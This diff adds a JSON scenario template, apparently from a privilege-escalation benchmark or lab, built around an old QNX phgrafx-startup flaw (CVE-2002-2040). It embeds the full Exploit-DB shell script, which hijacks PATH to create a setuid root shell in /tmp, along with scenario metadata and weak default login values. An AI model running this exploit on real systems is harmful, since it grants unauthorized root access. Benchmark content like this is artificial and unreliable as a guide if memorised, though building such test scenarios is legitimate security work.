@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_21504",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: QNX RTOS 4.25/6.1 - 'phgrafx-startup' Local Privilege Escalation (CVE-2002-2040;OSVDB-56494)\n\nExploit source code (21504.sh):\n```\nsource: https://www.securityfocus.com/bid/4916/info\n\n\nThe QNX phgrafx-startup utility is prone to an issue which may make it possible for local attackers to escalate privileges. This issue is due to unsafe use of the system() function to invoke other programs. This vulnerability may be trivially exploited to gain root privileges.\n\n#!/bin/sh\n#\n# click test,restore,continue\n# now you should have a setuid root shell waiting in /tmp/badc0ded\n#\n# www.badc0ded.com\necho \"#!/bin/sh\" > /tmp/crttrap\necho \"cp /bin/sh /tmp/badc0ded\" >> /tmp/crttrap\necho \"chmod 4777 /tmp/badc0ded\" >> /tmp/crttrap\necho \"/usr/bin/crttrap \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9 \" >> /tmp/crttrap\nchmod 755 /tmp/crttrap\nexport PATH=\"/tmp:$PATH\"\n/usr/photon/bin/phgrafx-startup\n```",
+  "cve": "CVE-2002-2040;OSVDB-56494",
+  "exploitdb_id": "21504",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_21504",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
